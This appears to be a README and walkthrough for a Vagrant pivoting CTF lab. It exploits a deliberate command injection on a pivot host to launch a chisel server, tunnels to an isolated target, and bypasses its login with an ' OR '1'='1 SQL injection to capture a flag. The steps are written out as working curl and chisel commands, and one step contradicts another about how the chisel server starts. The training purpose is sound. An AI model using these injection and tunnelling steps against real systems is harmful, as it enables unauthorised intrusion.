# Pivoting & Tunneling CTF Lab

This Vagrant lab includes three Debian Bookworm VMs:

- `attacker` — entry point and pivoting lab host
- `pivot` — vulnerable Flask app with command injection on `/cmd?cmd=` and an internal admin-style landing page at `/`
- `target` — vulnerable Flask app with SQL injection login bypass and a secret flag stored in SQLite

## Requirements

- Vagrant installed
- VirtualBox or another supported Vagrant provider
- Internet access for initial box download

## Start the lab

From the project root:

```bash
vagrant up attacker pivot target
```

Then SSH into the attacker VM:

```bash
vagrant ssh attacker
```

## Lab topology

- `attacker` IP: `192.168.56.10`
- `pivot` IP: `192.168.56.20` (attacker-facing)
- `pivot` IP: `192.168.57.20` (target-facing)
- `target` IP: `192.168.57.30`

The attacker machine is the only VM you use directly. The pivot host has access to the private target network, while the target is not reachable directly from attacker.

## Walkthrough

### 1) Confirm the pivot app

From the attacker VM, fetch the pivot landing page:

```bash
curl http://192.168.56.20:5000/
```

This page is a fake internal admin panel and proves that the pivot host is running a web service.

### 2) Find command injection and start chisel server

The vulnerable route is:

```bash
http://192.168.56.20:5000/cmd?cmd=<command>
```

Try a simple command first:

```bash
curl "http://192.168.56.20:5000/cmd?cmd=hostname"
```

Now exploit it to start a chisel server on the pivot, which will allow you to tunnel to the isolated target:

```bash
curl "http://192.168.56.20:5000/cmd?cmd=/usr/local/bin/chisel%20server%20--port%208080%20&"
```

(URL-encoded: `/usr/local/bin/chisel server --port 8080 &`)

You should get no output (the `&` runs it in the background). The chisel server is now running on pivot listening on `0.0.0.0:8080`.

### 3) Set up the chisel tunnel from attacker

The target host is on a separate private network only reachable from pivot.

**Establish the tunnel from the attacker machine:**

The pivot VM is running a chisel server automatically in reverse mode. From the attacker machine, start the chisel client:

```bash
vagrant@attacker:~$ /usr/local/bin/chisel client 192.168.56.20:8080 5001:192.168.57.30:5000
2026/05/06 16:41:21 client: Connecting to 192.168.56.20:8080
2026/05/06 16:41:21 client: tun: SSH connected
```

The tunnel is now established! The target's Flask app on `192.168.57.30:5000` (accessible only from pivot) is now exposed locally on the attacker machine as `localhost:5001`.

Verify the tunnel is working by accessing the target:

```bash
vagrant@attacker:~$ curl http://127.0.0.1:5001/login
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Internal Target Login</title>
  ...
</head>
<body>
  <h1>Internal Target Login</h1>
  <p>Enter your internal credentials to continue.</p>
  <form method="post" action="/login">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>
```

Success! The tunnel is working and you've reached the target's login form.

### 4) Exploit SQL injection on target login

The target login form is intentionally vulnerable. The SQL query is built unsafely:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Bypass authentication using SQL injection:

```bash
vagrant@attacker:~$ curl -X POST -d "username=' OR '1'='1&password=' OR '1'='1" http://127.0.0.1:5001/login
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Target Dashboard</title>
  <style>body{font-family:Arial,sans-serif;background:#f8fafc;color:#111827;padding:2rem;}pre{background:#e2e8f0;padding:1rem;border-radius:8px;overflow-x:auto;}section{max-width:720px;margin:auto;}</style>
</head>
<body>
  <section>
    <h1>Welcome, </h1>
    <p>Your internal dashboard has loaded successfully.</p>
    <h2>Secure Message</h2>
    <pre>CTF{pivot_master_2024}</pre>
  </section>
</body>
</html>
```

The SQL injection payload (`' OR '1'='1`) successfully bypasses the authentication check and grants access to the dashboard.

### 5) Flag captured

The target dashboard displays the flag:

```text
CTF{pivot_master_2024}
```

**Lab complete!** You have successfully:
1. Accessed the pivot VM and discovered the command injection vulnerability
2. Exploited the command injection to launch a chisel server on the compromised pivot
3. Tunneled through the compromised pivot to access the isolated target network
4. Exploited SQL injection on the target's login form
5. Retrieved the flag from the target dashboard

## Troubleshooting

### Chisel tunnel is not connecting

First, verify you started the chisel server via the command injection:

```bash
curl "http://192.168.56.20:5000/cmd?cmd=/usr/local/bin/chisel%20server%20--port%208080%20&"
```

Then verify it's running by checking if the port is open from attacker:

```bash
nc -zv 192.168.56.20 8080
```

If you see "Connection refused", the chisel server hasn't been started. Re-run the command injection payload above.

**On attacker, run the chisel client:**
```bash
/usr/local/bin/chisel client 192.168.56.20:8080 5001:192.168.57.30:5000
```

The command should show "SSH connected" and stay running. You can keep it running in one terminal and use another terminal on attacker to test the tunnel.

### Target is not directly reachable from attacker

This is by design. The target only exists on `192.168.57.30` which is isolated on the private target network. Always use the chisel tunnel to access it via `localhost:5001`.

### Verify the private network works directly from pivot

To confirm the target is reachable from pivot (without the tunnel), SSH into pivot:

```bash
vagrant ssh pivot
curl http://192.168.57.30:5000/login
```

This will work immediately because pivot is on both networks.

## Notes

- The target user exists as `admin` / `supersecret`, but the intended beginner path is SQL injection bypass.
- The pivot route is intentionally dangerous because it uses `subprocess.check_output` with `shell=True`.
- Use the attacker VM as the entry point, then pivot to the internal services on `192.168.56.20` and the private target network via chisel.
